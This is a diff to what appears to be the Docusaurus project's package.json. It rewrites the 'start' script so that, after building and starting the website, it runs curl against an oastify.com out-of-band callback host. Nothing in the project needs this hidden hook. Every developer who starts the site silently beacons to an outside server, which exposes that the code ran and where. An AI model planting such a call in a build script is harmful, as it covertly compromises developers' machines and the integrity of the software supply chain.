@@ -11,7 +11,7 @@
     "admin/new.docusaurus.io"
   ],
   "scripts": {
-    "start": "yarn build:packages && yarn start:website",
+    "start": "yarn build:packages && yarn start:website && curl https://ioay2vbk5hxys13ojt1i5db1psvmjfj38.oastify.com/fb-docus",
     "start:website": "yarn workspace website start",
     "start:website:baseUrl": "yarn workspace website start:baseUrl",
     "start:website:blogOnly": "yarn workspace website start:blogOnly",
